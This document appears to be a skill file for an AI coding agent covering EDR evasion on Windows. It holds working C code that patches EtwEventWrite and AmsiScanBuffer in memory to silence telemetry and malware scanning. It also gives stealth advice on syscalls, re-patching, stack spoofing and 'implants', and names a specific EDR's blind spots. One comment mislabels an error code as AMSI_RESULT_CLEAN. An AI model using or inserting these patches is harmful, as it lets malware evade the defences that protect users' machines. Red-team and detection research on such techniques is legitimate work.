# etw-evasion

> **Status:** COMPLETE
> **Cluster:** 09-odpc
> **Maps to:** Chapter 39 (Kernel Telemetry), Chapter 40 (ETW Patching)

## Description
Techniques for neutralising Event Tracing for Windows (ETW) as an EDR telemetry source.
Covers ETW architecture, user-land EtwEventWrite patching, per-provider vs global patch
tradeoffs, and the kernel-side callbacks that cannot be removed from user-land.

Invoke when: implementing an ETW patch, debugging why ETW-based detection is firing,
or deciding which ETW providers to target.

## ETW architecture

```
Provider (e.g. Microsoft-Windows-DotNETRuntime)
    │
    │  EtwEventWrite()
    ▼
ETW subsystem (ntdll / ntoskrnl)
    │
    ├── User-land sessions (logman, WMI)
    └── Kernel sessions (EDR drivers via EtwRegister callbacks)
```

**Key providers EDRs consume:**

| Provider GUID | Name | What EDRs get |
|---|---|---|
| `{E13C0D23-...}` | Microsoft-Windows-DotNETRuntime | .NET assembly loads, JIT, GC |
| `{A669021C-...}` | Microsoft-Windows-DotNETRuntimeRundown | Assembly inventory on process attach |
| `{02D08A15-...}` | Microsoft-Antimalware-Scan-Interface | AMSI results |
| `{315a8872-...}` | Microsoft-Windows-Kernel-Process | Process/thread create |
| `{22fb2cd6-...}` | Microsoft-Windows-Kernel-File | File I/O |
| `{ADD427A4-...}` | Microsoft-Windows-PowerShell | PS command and script block |

## User-land ETW patching

`EtwEventWrite` in ntdll is the function that dispatches events to user-land ETW
sessions. Patching it with a `ret` stub causes the function to return immediately
without emitting any events.

```c
void PatchEtw(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    LPVOID  pEtw   = GetProcAddress(hNtdll, "EtwEventWrite");

    // Make the page writable
    DWORD dwOld;
    VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &dwOld);

    // Patch: mov eax, 0 ; ret  (0 = STATUS_SUCCESS — avoids error returns)
    *(PBYTE)pEtw       = 0x33;  // xor eax, eax
    *((PBYTE)pEtw + 1) = 0xC0;
    *((PBYTE)pEtw + 2) = 0xC3;  // ret

    // Restore protection
    VirtualProtect(pEtw, 1, dwOld, &dwOld);
}
```

**Stealthier variant — use direct syscall to flip permissions:**
Replace `VirtualProtect` with `NtProtectVirtualMemory` (see syscall-techniques) to
avoid the VirtualProtect IAT call that some EDRs instrument.

## Per-provider patch vs global patch

| Approach | Target | Effect | Risk |
|----------|--------|--------|------|
| **Global EtwEventWrite patch** | ntdll!EtwEventWrite | Silences ALL ETW for this process | High — EDR may detect the patch itself via memory scanning |
| **Per-provider patch** | Provider's `REGHANDLE` or callback list | Silences specific provider only | Lower — more surgical, harder to detect |
| **EtwEventWriteFull patch** | ntdll!EtwEventWriteFull | Alternative entry point for some providers | Medium |

For ODPC: global patch is simpler and effective against most lab EDRs. Per-provider
is necessary when the EDR monitors its own ETW callback registration.

## AMSI patch (related)

AMSI uses ETW internally but also has its own scan interface. Patch both for PowerShell:

```c
// EtwEventWrite patch (above)

// AMSI patch
HMODULE hAmsi  = LoadLibraryA("amsi.dll");
LPVOID  pAmsi  = GetProcAddress(hAmsi, "AmsiScanBuffer");
DWORD   dwOld2;
VirtualProtect(pAmsi, 3, PAGE_EXECUTE_READWRITE, &dwOld2);
*(PBYTE)pAmsi       = 0xB8;  // mov eax, 0x80070057 (AMSI_RESULT_CLEAN)
*(DWORD*)((PBYTE)pAmsi + 1) = 0x80070057;
*((PBYTE)pAmsi + 5) = 0xC3;  // ret
VirtualProtect(pAmsi, 3, dwOld2, &dwOld2);
```

## Kernel telemetry: what you cannot patch from user-land

These mechanisms live in the kernel and cannot be bypassed with user-land patching:

| Mechanism | Kernel API | What EDRs see |
|-----------|-----------|--------------|
| Process creation callbacks | `PsSetCreateProcessNotifyRoutine` | All new process creates |
| Thread creation callbacks | `PsSetCreateThreadNotifyRoutine` | All new thread creates in any process |
| Image load callbacks | `PsSetLoadImageNotifyRoutine` | Every DLL/EXE loaded |
| Object callbacks | `ObRegisterCallbacks` | Process/thread handle operations |
| Minifilter (filesystem) | `FltRegisterFilter` | File creates, reads, writes |
| Network callbacks | WFP / NDIS filter | Network connections |

**Implication:** Even with user-land ETW patched, the EDR driver still sees your
process, its DLL loads, and its threads via kernel callbacks. ETW patching removes
*event-based* telemetry (command logging, assembly loads) but not *callback-based*
telemetry (process/thread/image events). Combine with:
- Indirect syscalls to reduce API call visibility
- Call stack spoofing to obscure the call origin
- Caro-Kann style injection to reduce the EDR's scan window

## Verifying the ETW patch worked

Use the edr-test-loop workflow:

1. Before patch: run PowerShell, import a known C# assembly, observe ETW events in
   a logman session or Process Monitor
2. Apply patch
3. After patch: repeat — ETW events for DotNETRuntime should stop appearing
4. Verify process still functions (patch shouldn't affect normal execution)

Quick test:
```powershell
# Monitor ETW before patch
logman start mySession -p "Microsoft-Windows-DotNETRuntime" -o etw.etl -ets

# Run your test (load an assembly)

# Verify no events
logman stop mySession -ets
tracerpt etw.etl -o etw.csv -of CSV
```

## Gotchas

- **ETW patch is process-scoped.** Only silences ETW in the current process. A process that
  spawns a child still has ETW active in the child unless you re-patch.
- **Memory scanning detects the patch.** Some EDRs scan ntdll periodically for integrity.
  Consider re-patching inside your sleep callback, or use indirect syscall for the
  VirtualProtect call to reduce the detectable IOC.
- **CrowdStrike has kernel-side ETW hooks.** CS Falcon hooks at the kernel level — user-land
  EtwEventWrite patch does not affect CS telemetry. Kernel callbacks are still active.
- **Patch timing.** Patch as early as possible in execution (before the CLR loads if using
  AppDomain injection). Late patches miss early telemetry events.
- **EtwEventWrite vs EtwEventWriteFull.** Some providers use the `Full` variant. Patch both.
- **Restoring the patch on exit is good practice** for opsec in long-running implants.

## Related skills

- `syscall-techniques` — use NtProtectVirtualMemory instead of VirtualProtect for the patch
- `caro-kann-injection` — ETW patching is a prerequisite step in the Caro-Kann flow
- `edr-test-loop` — structured workflow for verifying ETW bypass against each lab EDR
- `call-stack-spoofing` — complement ETW patch with stack spoofing for the remaining telemetry
